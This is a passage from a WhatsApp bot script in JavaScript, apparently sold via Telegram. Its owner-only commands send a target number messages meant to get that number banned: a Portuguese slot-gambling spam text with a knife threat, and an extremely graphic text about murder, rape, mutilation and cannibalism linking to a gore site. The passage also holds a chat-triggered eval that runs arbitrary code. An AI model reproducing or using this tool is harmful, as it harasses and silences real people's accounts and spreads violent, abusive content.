😍 Olá, pessoal, estamos ligando! Apresentando o mais novo 🎰 caça-níquel da Indonésia 🇮🇩, é muito fácil ganhar e você pode levar centenas de milhões para casa! 💸✨ Corra e cadastre-se neste link: 👇 [https://link-placeholder.com/slotmantap2] Cadastre-se agora, um bônus de Rp88.888 aguarda! 🤑 Não é cadastrado? Cuidado, eu vou! 👺🔪 📱 Fale comigo no WhatsApp: [https://wa.me/+62xxx] Vamos fazer este caça-níquel viralizar, é realmente oficial, meu número é anti-banimento! 💯🔥

BUY MURBAN KE t.me/ArgaOffc${q}`},{quoted: m})
await sleep(2000)
argaReply(`👆  text above then check Target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned`)
break
}

case "mt-banedv3": {
if (!isAccargaDev) return argaReply(`*\`Fitur ini Khusus Owner\`*`)
if (!q) return argaReply(' Enter the Target number Prefix "+" and Country Code')
await arga.sendMessage(from, {text: `MT BAND PRIB ARGA
Good afternoon Sir or Madam I want to offer you a job 🤑, Before that let me introduce myself ArgaOffc I come from Mexico 🇲🇽🇲🇽, I want to offer you a job, namely to be my subordinate or cartel ☠️ https://xgore.net/the-couple-was-dismembered-and-left-on-the-street/, The task is very easy 🤩, You only need to drive a car recklessly and drink alcohol then you look for a random person then you extort him to give you 200,000,000,000.00 US dollars 🤑 If he doesn't want to then you threaten him until he wants to 🔪, if he still doesn't want to you take a firearm ☠️ Then you shoot him at the target if he is dead ☠️☠️ You rape his body until you are satisfied 🤩 If you are satisfied, then you only need to skin it☠️, then you take the internal organs☠️ Then you sell it to the black market, if you have sold the corpse, you mutilate it, then you put it in a suitcase and throw it in the ravine☠️ Or you can also cook and eat the corpse☠️, How easy is the job? Just like that, I will pay you 200,001,000,000,000 US dollars🤑🤑, What if you are interested in the job? You can contact the WHATSAPP number below👇👇 https://web.whatsapp.com/killer+killedchild.numarası?telefon=+62

BUY MURBAN KE t.me/ArgaOffc${q}`},{quoted: m})
await sleep(2000)
argaReply(`👆  text above then check Target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned`)
break
}

// ========== [ 📂 BATAS CASE 📂 ] ========= //
default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.argaReply(evaled);
} catch (err) {
m.argaReply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.argaReply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});